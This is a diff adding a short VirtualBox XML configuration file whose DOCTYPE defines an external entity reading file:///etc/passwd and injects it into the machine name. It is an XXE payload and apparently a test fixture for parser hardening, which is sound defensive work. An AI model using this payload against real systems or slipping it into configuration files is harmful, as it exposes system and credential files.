@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE VirtualBox [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<VirtualBox xmlns="http://www.virtualbox.org/" version="1.19-linux">
+  <Machine uuid="{11111111-2222-3333-4444-555566667777}" name="&xxe;" OSType="Debian_64"><Hardware><Memory RAMSize="1024"/></Hardware></Machine>
+</VirtualBox>
